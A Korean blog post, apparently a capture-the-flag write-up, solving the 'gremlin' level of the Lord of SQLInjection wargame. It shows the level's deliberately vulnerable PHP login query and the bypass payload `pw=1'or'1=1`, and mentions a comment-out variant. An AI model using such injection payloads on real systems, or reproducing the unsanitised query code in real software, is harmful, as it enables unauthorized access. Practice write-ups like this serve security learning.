---
layout: post
title: ! "[LOS] gremlin"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - LOS
  - Web-hacking
  - gremlin
  - write-up
---

![]({{ site.baseurl }}/assets/posts/los-gremlin/gremlin.png)

`query : select id from prob_gremlin where id='' and pw=''`

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```
첫번째 문제 gremlin은 이런식으로 query문이 떠있고 url로 id와 pw를 집어넣으면 된다.
id에는 아무값이나 넣어도 되지만 pw는 참이 되어야 하므로
or문을 써야할 것 같다.
쿼리에서 id와 pw를 감싸는 ' 가 있기 때문에 그것까지 고려를 해서 값을 넘겨야 한다.

`?id=(아무값)&pw=1'or'1=1`

이런식으로 써줘야

`query : select id from prob_gremlin where id='mmjlee314' and pw='1'or'1=1'`

이렇게 쿼리문이 완성된다.
1 또는 1이 되므로 pw는 참이 된다.

또 다른 방법으로는 id 부분을 id='1'or'1=1' 이렇게 해주고 pw 부분을 주석처리 하는 것도 있다.
![]({{ site.baseurl }}/assets/posts/los-gremlin/gremlin_clear.png)

그렘린 클리어!
